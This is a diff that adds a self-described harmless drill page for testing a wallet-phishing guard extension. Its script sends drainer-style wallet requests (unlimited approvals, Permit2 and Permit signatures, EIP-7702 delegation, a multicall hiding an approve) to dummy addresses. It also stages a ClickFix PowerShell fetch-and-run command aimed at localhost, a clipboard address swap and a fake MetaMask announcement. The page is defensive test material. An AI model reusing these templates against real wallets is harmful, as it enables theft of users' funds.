@@ -1,0 +1,167 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Web3 Phish Guard drill</title>
+<style>
+  :root { color-scheme: dark; }
+  body { margin: 0; font: 15px/1.5 system-ui, sans-serif; background: #0e0f14; color: #e8e8ef; }
+  main { max-width: 860px; margin: 0 auto; padding: 32px 20px 80px; }
+  h1 { font-size: 24px; margin: 0 0 4px; }
+  .sub { color: #9a9ab0; margin-bottom: 24px; }
+  section { border: 1px solid #262838; border-radius: 12px; padding: 16px 18px; margin: 14px 0; background: #14151d; }
+  h2 { font-size: 15px; margin: 0 0 10px; color: #c9c9ff; }
+  .row { display: flex; flex-wrap: wrap; gap: 8px; }
+  button { font: inherit; padding: 8px 14px; border-radius: 8px; border: 1px solid #3a3d55; background: #1d1f2c; color: #fff; cursor: pointer; }
+  button:hover { background: #2a2d40; }
+  button.danger { border-color: #7a2a2a; }
+  input, textarea { font: inherit; width: 100%; box-sizing: border-box; padding: 8px 10px; border-radius: 8px; border: 1px solid #3a3d55; background: #0e0f14; color: #fff; }
+  pre { background: #0b0c11; border: 1px solid #262838; border-radius: 8px; padding: 10px; max-height: 260px; overflow: auto; font-size: 12px; white-space: pre-wrap; }
+  .ok { color: #7bd88f; } .bad { color: #ff8a8a; } .muted { color: #9a9ab0; }
+  code { background: #1d1f2c; padding: 1px 5px; border-radius: 4px; }
+</style>
+</head>
+<body>
+<main>
+  <h1>Web3 Phish Guard drill</h1>
+  <div class="sub">A harmless page that behaves like a wallet drainer. Nothing here can move funds: every request targets a dead address on whatever chain your wallet is on, and you reject it in the wallet anyway. The point is to see which requests the extension holds <em>before</em> the wallet shows them.</div>
+
+  <section>
+    <h2>0. Status</h2>
+    <div class="row">
+      <button id="connect">Connect wallet (eth_requestAccounts)</button>
+      <button id="chain">Chain id</button>
+    </div>
+    <p class="muted">Expected: no hold. Connecting is normal. The extension only notes a connect that happens without a click.</p>
+  </section>
+
+  <section>
+    <h2>1. Always held, on every site</h2>
+    <div class="row">
+      <button class="danger" id="approveUnlimited">Unlimited approve</button>
+      <button class="danger" id="setApprovalForAll">setApprovalForAll(true)</button>
+      <button class="danger" id="permit2">Permit2 signature</button>
+      <button class="danger" id="permit">ERC-2612 Permit signature</button>
+      <button class="danger" id="seaport">Seaport order signature</button>
+      <button class="danger" id="ethSign">eth_sign</button>
+      <button class="danger" id="eip7702">EIP-7702 delegation</button>
+      <button class="danger" id="transferAuth">EIP-3009 TransferWithAuthorization</button>
+      <button class="danger" id="safeDelegate">Safe tx with delegatecall</button>
+    </div>
+    <p class="muted">Expected: the red extension dialog appears for each of these, whatever the page's score. "Reject" → the page sees error code 4001 and the wallet never shows the request. "Allow" → the wallet's own prompt appears; reject it there.</p>
+  </section>
+
+  <section>
+    <h2>2. Held only when the page looks risky</h2>
+    <div class="row">
+      <button id="approveLimited">Limited approve (100 tokens)</button>
+      <button id="transfer">ERC-20 transfer</button>
+      <button id="sendEth">Send 0 ETH</button>
+      <button id="multicall">multicall hiding an approve</button>
+      <button id="sendCalls">wallet_sendCalls batch (EIP-5792)</button>
+    </div>
+    <p class="muted">Expected on a clean page: straight to the wallet. Open this page with <code>#w3pg-drill=45</code> (warn) or <code>#w3pg-drill=75</code> in the URL and reload: the extension pretends the page scored that much (localhost only), and these are held too. The multicall and batch must be held at any score because they hide an unlimited approve.</p>
+  </section>
+
+  <section>
+    <h2>3. Page-level traps (no wallet needed)</h2>
+    <div class="row">
+      <button id="clickfix">ClickFix: copy a PowerShell command</button>
+      <button id="swap">Clipboard swap: copy a different address than selected</button>
+      <button id="fakeWallet">Announce a fake "MetaMask" (EIP-6963)</button>
+    </div>
+    <p>Select this address, then press the swap button: <span id="addr">0x1111111111111111111111111111111111111111</span></p>
+    <p>Seed-phrase trap (type or paste 12 BIP-39 words): <input id="seed" placeholder="abandon ability able about above absent absorb abstract absurd abuse access accident"></p>
+    <p>Private-key trap (the label makes it a key field): <label>Private key <input id="pk" placeholder="0x + 64 hex"></label></p>
+    <p class="muted">Expected: ClickFix / clipboard swap / fake wallet raise the page score (badge). A seed phrase or a key in a key field puts up the full-page stop.</p>
+  </section>
+
+  <section>
+    <h2>Log</h2>
+    <pre id="log"></pre>
+  </section>
+</main>
+<script>
+(() => {
+  const log = (m, cls) => { const el = document.getElementById("log"); const line = document.createElement("div"); if (cls) line.className = cls; line.textContent = `${new Date().toLocaleTimeString()}  ${m}`; el.prepend(line); };
+  const DEAD = "0x000000000000000000000000000000000000dEaD";
+  const SPENDER = "0x1111111111111111111111111111111111111111"; // an EOA-looking spender: the extension flags EOA spenders
+  const TOKEN = "0x2222222222222222222222222222222222222222";
+  const pad = (hex) => hex.replace(/^0x/, "").padStart(64, "0");
+  const MAX = "f".repeat(64);
+  let account = null;
+
+  const eth = () => { const p = window.ethereum; if (!p) { log("no window.ethereum: install MetaMask / Rabby", "bad"); throw new Error("no provider"); } return p; };
+  const run = async (label, fn) => {
+    try { const r = await fn(); log(`${label}: wallet answered ${JSON.stringify(r).slice(0, 80)}`, "ok"); }
+    catch (e) { log(`${label}: ${e && e.code === 4001 ? "rejected (4001)" : "error"} ${e && e.message ? e.message.slice(0, 120) : e}`, e && e.code === 4001 ? "bad" : "muted"); }
+  };
+  const send = (tx) => eth().request({ method: "eth_sendTransaction", params: [{ from: account, ...tx }] });
+  const needAccount = async () => { if (!account) { const a = await eth().request({ method: "eth_requestAccounts" }); account = a[0]; log(`connected ${account}`); } return account; };
+
+  document.getElementById("connect").onclick = () => run("connect", needAccount);
+  document.getElementById("chain").onclick = () => run("chainId", () => eth().request({ method: "eth_chainId" }));
+
+  // ---- 1. always held ----
+  document.getElementById("approveUnlimited").onclick = () => run("approve(unlimited)", async () => { await needAccount(); return send({ to: TOKEN, data: "0x095ea7b3" + pad(SPENDER) + MAX }); });
+  document.getElementById("setApprovalForAll").onclick = () => run("setApprovalForAll", async () => { await needAccount(); return send({ to: TOKEN, data: "0xa22cb465" + pad(SPENDER) + pad("1") }); });
+  document.getElementById("permit2").onclick = () => run("Permit2", async () => {
+    const owner = await needAccount();
+    const chainId = parseInt(await eth().request({ method: "eth_chainId" }), 16);
+    const td = { types: { EIP712Domain: [{ name: "name", type: "string" }, { name: "chainId", type: "uint256" }, { name: "verifyingContract", type: "address" }], PermitSingle: [{ name: "details", type: "PermitDetails" }, { name: "spender", type: "address" }, { name: "sigDeadline", type: "uint256" }], PermitDetails: [{ name: "token", type: "address" }, { name: "amount", type: "uint160" }, { name: "expiration", type: "uint48" }, { name: "nonce", type: "uint48" }] },
+      domain: { name: "Permit2", chainId, verifyingContract: "0x000000000022D473030F116dDEE9F6B43aC78BA3" }, primaryType: "PermitSingle",
+      message: { details: { token: TOKEN, amount: "1461501637330902918203684832716283019655932542975", expiration: "281474976710655", nonce: 0 }, spender: SPENDER, sigDeadline: "281474976710655" } };
+    return eth().request({ method: "eth_signTypedData_v4", params: [owner, JSON.stringify(td)] });
+  });
+  document.getElementById("permit").onclick = () => run("Permit", async () => {
+    const owner = await needAccount();
+    const chainId = parseInt(await eth().request({ method: "eth_chainId" }), 16);
+    const td = { types: { EIP712Domain: [{ name: "name", type: "string" }, { name: "version", type: "string" }, { name: "chainId", type: "uint256" }, { name: "verifyingContract", type: "address" }], Permit: [{ name: "owner", type: "address" }, { name: "spender", type: "address" }, { name: "value", type: "uint256" }, { name: "nonce", type: "uint256" }, { name: "deadline", type: "uint256" }] },
+      domain: { name: "USD Coin", version: "2", chainId, verifyingContract: TOKEN }, primaryType: "Permit", message: { owner, spender: SPENDER, value: "115792089237316195423570985008687907853269984665640564039457584007913129639935", nonce: 0, deadline: "281474976710655" } };
+    return eth().request({ method: "eth_signTypedData_v4", params: [owner, JSON.stringify(td)] });
+  });
+  document.getElementById("seaport").onclick = () => run("Seaport order", async () => {
+    const owner = await needAccount();
+    const chainId = parseInt(await eth().request({ method: "eth_chainId" }), 16);
+    const td = { types: { EIP712Domain: [{ name: "name", type: "string" }, { name: "version", type: "string" }, { name: "chainId", type: "uint256" }, { name: "verifyingContract", type: "address" }], OrderComponents: [{ name: "offerer", type: "address" }, { name: "zone", type: "address" }, { name: "salt", type: "uint256" }] },
+      domain: { name: "Seaport", version: "1.6", chainId, verifyingContract: "0x0000000000000068F116a894984e2DB1123eB395" }, primaryType: "OrderComponents", message: { offerer: owner, zone: DEAD, salt: "1" } };
+    return eth().request({ method: "eth_signTypedData_v4", params: [owner, JSON.stringify(td)] });
+  });
+  document.getElementById("ethSign").onclick = () => run("eth_sign", async () => { const owner = await needAccount(); return eth().request({ method: "eth_sign", params: [owner, "0x" + "ab".repeat(32)] }); });
+  document.getElementById("eip7702").onclick = () => run("EIP-7702", async () => { await needAccount(); return send({ to: account, type: "0x4", authorizationList: [{ chainId: "0x1", address: SPENDER, nonce: "0x0" }] }); });
+  document.getElementById("transferAuth").onclick = () => run("TransferWithAuthorization", async () => {
+    const owner = await needAccount();
+    const chainId = parseInt(await eth().request({ method: "eth_chainId" }), 16);
+    const td = { types: { EIP712Domain: [{ name: "name", type: "string" }, { name: "version", type: "string" }, { name: "chainId", type: "uint256" }, { name: "verifyingContract", type: "address" }], TransferWithAuthorization: [{ name: "from", type: "address" }, { name: "to", type: "address" }, { name: "value", type: "uint256" }, { name: "validAfter", type: "uint256" }, { name: "validBefore", type: "uint256" }, { name: "nonce", type: "bytes32" }] },
+      domain: { name: "USD Coin", version: "2", chainId, verifyingContract: TOKEN }, primaryType: "TransferWithAuthorization", message: { from: owner, to: SPENDER, value: "1000000", validAfter: "0", validBefore: "281474976710655", nonce: "0x" + "11".repeat(32) } };
+    return eth().request({ method: "eth_signTypedData_v4", params: [owner, JSON.stringify(td)] });
+  });
+  document.getElementById("safeDelegate").onclick = () => run("SafeTx delegatecall", async () => {
+    const owner = await needAccount();
+    const chainId = parseInt(await eth().request({ method: "eth_chainId" }), 16);
+    const td = { types: { EIP712Domain: [{ name: "chainId", type: "uint256" }, { name: "verifyingContract", type: "address" }], SafeTx: [{ name: "to", type: "address" }, { name: "value", type: "uint256" }, { name: "data", type: "bytes" }, { name: "operation", type: "uint8" }, { name: "nonce", type: "uint256" }] },
+      domain: { chainId, verifyingContract: DEAD }, primaryType: "SafeTx", message: { to: SPENDER, value: "0", data: "0x", operation: 1, nonce: 0 } };
+    return eth().request({ method: "eth_signTypedData_v4", params: [owner, JSON.stringify(td)] });
+  });
+
+  // ---- 2. score-dependent ----
+  document.getElementById("approveLimited").onclick = () => run("approve(100)", async () => { await needAccount(); return send({ to: TOKEN, data: "0x095ea7b3" + pad(SPENDER) + pad("64") }); });
+  document.getElementById("transfer").onclick = () => run("transfer", async () => { await needAccount(); return send({ to: TOKEN, data: "0xa9059cbb" + pad(DEAD) + pad("1") }); });
+  document.getElementById("sendEth").onclick = () => run("send 0 ETH", async () => { await needAccount(); return send({ to: DEAD, value: "0x0" }); });
+  document.getElementById("multicall").onclick = () => run("multicall(approve)", async () => { await needAccount(); const inner = "095ea7b3" + pad(SPENDER) + MAX; return send({ to: TOKEN, data: "0xac9650d8" + pad("20") + pad("1") + pad("20") + pad((inner.length / 2).toString(16)) + inner }); });
+  document.getElementById("sendCalls").onclick = () => run("wallet_sendCalls", async () => { await needAccount(); const chainId = await eth().request({ method: "eth_chainId" }); return eth().request({ method: "wallet_sendCalls", params: [{ version: "2.0.0", chainId, from: account, calls: [{ to: DEAD, value: "0x0" }, { to: TOKEN, data: "0x095ea7b3" + pad(SPENDER) + MAX }] }] }); });
+
+  // ---- 3. page traps ----
+  document.getElementById("clickfix").onclick = async () => { const cmd = "powershell -w hidden -c \"iwr http://127.0.0.1/drill | iex\""; try { await navigator.clipboard.writeText(cmd); log("copied a ClickFix command to the clipboard (harmless URL)"); } catch (e) { log("clipboard write failed: " + e.message, "bad"); } };
+  document.getElementById("swap").onclick = async () => { try { await navigator.clipboard.writeText("0x9999999999999999999999999999999999999999"); log("copied 0x9999… while 0x1111… was selected"); } catch (e) { log("clipboard write failed: " + e.message, "bad"); } };
+  document.getElementById("fakeWallet").onclick = () => {
+    const provider = { isMetaMask: true, request: async () => { throw new Error("fake"); } };
+    window.dispatchEvent(new CustomEvent("eip6963:announceProvider", { detail: Object.freeze({ info: { uuid: "d1d1d1d1-0000-4000-8000-000000000001", name: "Totally Real Wallet", icon: "data:image/svg+xml,", rdns: "io.metamask" }, provider }) }));
+    log("announced a provider with MetaMask's rdns under another name");
+  };
+  window.addEventListener("load", () => log(`page loaded; ${window.ethereum ? "window.ethereum present" : "no window.ethereum"}; drill score: ${(location.hash.match(/w3pg-drill=(\d+)/) || [])[1] || "none"}`));
+})();
+</script>
+</body>
+</html>
